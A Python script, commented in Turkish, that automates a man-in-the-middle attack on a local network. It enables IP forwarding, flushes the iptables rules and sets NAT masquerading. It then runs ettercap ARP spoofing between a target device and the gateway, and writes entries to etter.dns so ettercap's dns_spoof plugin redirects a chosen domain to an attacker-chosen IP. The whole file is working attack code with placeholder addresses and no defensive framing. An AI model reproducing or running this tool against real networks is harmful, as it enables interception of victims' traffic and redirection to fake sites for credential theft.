
import subprocess
import time
import sys

# Yapılandırma Ayarları
hedef_ip = "........"       # Saldırı yapılacak cihazın IP'si
ag_gecidi_ip = "......."    # Ağ geçidi IP'si
ag_arayuzu = "enp0s3"         # Kullanılacak ağ arayüzü
gercek_domain = "......."  # Taklit edilecek domain
sahte_ip = "......"      # Yönlendirilecek sahte IP

def ip_yonlendirmeyi_aktif_et():
    try:
        # IP yönlendirmeyi aktif et
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
        
        # Varolan iptables kurallarını temizle
        subprocess.run(["sudo", "iptables", "--flush"], check=True)
        subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], check=True)
        subprocess.run(["sudo", "iptables", "--delete-chain"], check=True)
        subprocess.run(["sudo", "iptables", "--table", "nat", "--delete-chain"], check=True)
        
        # MITM için NAT kurallarını ayarla
        subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], check=True)
        subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-o", ag_arayuzu, "-j", "MASQUERADE"], check=True)
        
        print("[+] IP yönlendirme aktif edildi ve iptables yapılandırıldı")
    except subprocess.CalledProcessError as hata:
        print(f"[!] Ağ yapılandırma hatası: {hata}")
        sys.exit(1)

def arp_spoofing_baslat():
    print(f"[*] ARP spoofing başlatılıyor: {hedef_ip} <-> {ag_gecidi_ip}")
    try:
        # Arka planda çalıştır
        arp_sureci = subprocess.Popen(
            ["sudo", "ettercap", "-T", "-q", "-M", "arp:remote", 
             f"/{hedef_ip}//", f"/{ag_gecidi_ip}//", "-i", ag_arayuzu],
            stderr=subprocess.PIPE
        )
        time.sleep(5)  # Başlaması için bekle
        if arp_sureci.poll() is not None:
            hata = arp_sureci.stderr.read().decode()
            print(f"[!] ARP spoofing başarısız: {hata}")
            sys.exit(1)
        return arp_sureci
    except Exception as hata:
        print(f"[!] ARP spoofing hatası: {hata}")
        sys.exit(1)

def dns_spoofing_baslat():
    print("[*] DNS spoofing başlatılıyor")
    try:
        # Özel dns_spoof yapılandırması oluştur
        with open("/etc/ettercap/etter.dns", "a") as dosya:
            dosya.write(f"{gercek_domain} A {sahte_ip}\n")
            dosya.write(f"{gercek_domain} PTR {sahte_ip}\n")
        
        # Arka planda çalıştır
        dns_sureci = subprocess.Popen(
            ["sudo", "ettercap", "-T", "-q", "-P", "dns_spoof", 
             "-M", "arp:remote", f"/{hedef_ip}//", f"/{ag_gecidi_ip}//", "-i", ag_arayuzu],
            stderr=subprocess.PIPE
        )
        time.sleep(3)
        if dns_sureci.poll() is not None:
            hata = dns_sureci.stderr.read().decode()
            print(f"[!] DNS spoofing başarısız: {hata}")
            sys.exit(1)
        return dns_sureci
    except Exception as hata:
        print(f"[!] DNS spoofing hatası: {hata}")
        sys.exit(1)

def temizlik():
    print("\n[*] Temizlik yapılıyor...")
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], check=True)
    subprocess.run(["sudo", "iptables", "--flush"], check=True)
    subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], check=True)
    subprocess.run(["sudo", "killall", "ettercap"], check=True)
    print("[+] Temizlik tamamlandı")

def main():
    try:
        ip_yonlendirmeyi_aktif_et()
        arp_sureci = arp_spoofing_baslat()
        dns_sureci = dns_spoofing_baslat()
        
        print("[+] Saldırılar çalışıyor. Durdurmak için Ctrl+C tuşlarına basın...")
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        temizlik()
    except Exception as hata:
        print(f"[!] Hata: {hata}")
        temizlik()
        sys.exit(1)

if __name__ == "__main__":
    main()
